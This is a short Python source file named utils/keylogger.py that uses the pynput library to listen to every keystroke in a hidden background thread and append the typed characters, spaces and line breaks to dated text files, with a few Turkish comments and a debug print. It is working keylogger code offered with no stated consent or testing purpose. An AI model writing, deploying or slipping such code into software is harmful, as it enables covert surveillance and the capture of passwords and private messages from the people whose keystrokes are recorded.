# utils/keylogger.py
from pynput import keyboard
import os
import datetime

log_dir = "keylogs"
os.makedirs(log_dir, exist_ok=True)

def get_log_file_path():
    date = datetime.datetime.now().strftime('%Y-%m-%d')
    return os.path.join(log_dir, f"{date}.txt")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            with open(get_log_file_path(), "a", encoding="utf-8") as f:
                f.write(key.char)
        else:
            # Yalnızca önemli özel tuşları kaydet
            key_name = str(key).replace("Key.", "")
            if key_name in ["space", "enter"]:
                with open(get_log_file_path(), "a", encoding="utf-8") as f:
                    f.write("\n" if key_name == "enter" else " ")
    except Exception as e:
        print(f"Keylogger error: {e}")

    
    print(f"KEY: {key}")  # Bunu ekle, tuşa basınca konsola yazmalı
   


def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
